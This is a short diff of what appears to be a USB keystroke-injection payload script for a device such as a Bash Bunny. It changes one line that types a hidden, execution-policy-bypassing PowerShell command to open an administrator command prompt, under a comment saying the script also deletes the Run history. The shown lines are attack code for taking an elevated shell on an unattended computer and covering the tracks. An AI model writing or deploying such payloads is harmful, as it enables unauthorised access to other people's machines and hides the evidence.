@@ -57,7 +57,7 @@ LED R G 100
 # Launch powershell as admin and deletes Run history
 Q GUI r
 Q DELAY 1000
-Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18' -Verb runAs"
+Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=80' -Verb runAs"
 Q DELAY 500
 Q ENTER
 
